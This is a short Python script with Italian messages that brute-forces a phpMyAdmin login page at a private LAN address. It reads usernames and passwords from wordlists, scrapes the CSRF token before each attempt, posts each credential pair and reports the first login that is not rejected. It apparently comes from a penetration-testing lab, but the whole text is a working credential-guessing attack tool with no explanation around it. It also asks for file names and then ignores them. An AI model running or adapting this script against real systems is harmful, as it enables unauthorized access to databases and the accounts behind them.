import requests
from bs4 import BeautifulSoup

def ottieni_token(url):
    try:
        risposta = requests.get(url)
        if risposta.status_code == 200:
            soup = BeautifulSoup(risposta.text, 'html.parser')
            token = soup.find('input', {'name': 'token'})['value']
            return token
        else:
            print("Attenzione! C'è un errore", risposta.status_code)
            return None
    except requests.exceptions.RequestException as e:
        print("Errore nella richiesta del token:", e)
        return None

def main():
    usernames_file = input("\nInserisci il file contenente gli usernames: ")
    passwords_file = input("\nInserisci il file contenente le password: ")
    url = 'http://192.168.1.101/phpMyAdmin/'
    try:
        with open("usernames.txt") as file_utenti:
            lista_utenti = file_utenti.readlines()
        with open("passwords.txt") as file_passwords:
            lista_password = file_passwords.readlines()
            
            for username in lista_utenti:
                username = username.rstrip()

                for password in lista_password:
                    password = password.rstrip()

                    token = ottieni_token(url)
                    login = {'pma_username': username, 'pma_password': password, 'token': token}

                    try:
                        risposta = requests.post(url, data=login)
                        print(f"\n\nProvo con: {username} e {password}")

                        if risposta.status_code == 200:
                            if 'Access denied' in risposta.text:
                                print(f"Login Fallito. (token di sessione: {token})\n\n")
                            else:
                                print(f"Accesso trovato con: {username} e {password}. Token: {token}\n\n")
                                exit()
                        else:
                            print("Errore", risposta.status_code)
                    except requests.exceptions.RequestException as e:
                        print("Errore nella richiesta: ", e)
    except FileNotFoundError:
        print("Controlla il percorso dei file")

if __name__ == "__main__":
    main()
